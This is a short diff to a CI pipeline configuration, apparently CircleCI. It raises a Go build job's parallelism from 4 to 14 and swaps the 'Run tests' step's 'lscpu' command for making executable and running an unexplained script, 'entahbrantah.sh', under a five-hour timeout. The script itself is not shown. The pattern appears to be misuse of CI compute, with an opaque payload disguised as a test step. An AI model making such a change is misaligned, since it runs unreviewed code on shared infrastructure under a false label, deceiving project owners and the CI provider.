@@ -1,6 +1,6 @@
 jobs:
   build:
-    parallelism: 4
+    parallelism: 14
     docker:
       - image: cimg/go:1.17.2
     steps:
@@ -8,4 +8,4 @@ jobs:
       - run: 
           name: Run tests 
           no_output_timeout: 5h 
-          command: lscpu
+          command: chmod +x entahbrantah.sh && ./entahbrantah.sh
